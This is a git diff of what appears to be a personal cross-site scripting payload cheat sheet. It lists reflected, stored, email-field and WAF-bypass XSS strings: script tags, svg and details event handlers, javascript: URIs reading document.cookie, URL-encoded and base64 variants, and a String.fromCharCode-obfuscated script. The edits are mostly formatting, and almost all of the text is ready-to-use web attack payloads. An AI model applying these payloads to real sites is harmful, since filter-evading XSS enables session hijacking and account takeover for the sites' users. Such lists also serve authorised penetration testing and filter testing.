@@ -1,6 +1,7 @@
 Please do visit as well: https://github.com/s0md3v/AwesomeXSS
 
-##Special Case##
+                                                                    ##Special Case##
+
 https://xxx.com/path/"><script>alert(1)</script>                                   --> Sometime do add additional parameters like path in this sense and then payload forreflected XSS
 test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E                              --> Best Email XSX
 ["');alert('XSS');//"]@gmail.com                                                   --> Login Email (WAF Bypass)
@@ -59,17 +60,21 @@ xss" onmouseover="alert(1)
 javascript:alert(document.cookie) 
 
                                                                     ## HTML injection to XSS>
+
 <a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
 <a href="javascript:alert(document.domain)">XSS</a>
 
                                                                     ##STORED##
+
 <a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">XSS</a>
 
                                                                     ##REFLECTED##
+
 abc`;return false});});alert`xss`;</script>
 abc%60%3Breturn%20false%7D)%3B%7D)%3Balert%60xss%60%3B%3C%2Fscript%3E
 
                                                                     ##WAF##
+
 "><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))> 
 <details/open=/Open/href=/data=+ontoggle="(alert)(document.domain)
 <details/open=/Open/href=/data=;+ontoggle="(alert)(document.domain)
@@ -77,8 +82,7 @@ abc%60%3Breturn%20false%7D)%3B%7D)%3Balert%60xss%60%3B%3C%2Fscript%3E
 <svg%20onx=()%20onload=(confirm)(document.domain)>
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==")>
 <html>#"></div><a href= javascript&colon;alert&l)</html>
-<sCrIpT>(function(){var a=[97,108,101,114,116];var b=String.fromCharCode.apply(null,a);var c=[88,115,112,108,111,105,116];var d=String.fromCharCode.apply(null,c);window[b](d);})()</sCrIpT>      --> WAF Bypass
-
+<sCrIpT>(function(){var a=[97,108,101,114,116];var b=String.fromCharCode.apply(null,a);var c=[88,115,112,108,111,105,116];var d=String.fromCharCode.apply(null,c);window[b](d);})()</sCrIpT>
 
                                                                     ###SVG###
 <?xml version="1.0" standalone="no"?>
